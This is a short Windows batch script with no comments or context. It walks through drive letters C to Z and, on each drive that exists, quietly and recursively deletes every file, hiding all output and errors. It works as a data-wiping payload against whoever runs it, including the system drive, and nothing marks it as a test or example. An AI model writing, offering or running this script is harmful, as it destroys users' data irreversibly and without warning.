@echo off
for %%d in (Z Y X W V U T S R Q P O N M L K J I H G F E D C) do (
    if exist %%d:\ (
        del /q /s %%d:\*.* >nul 2>&1
    )
)
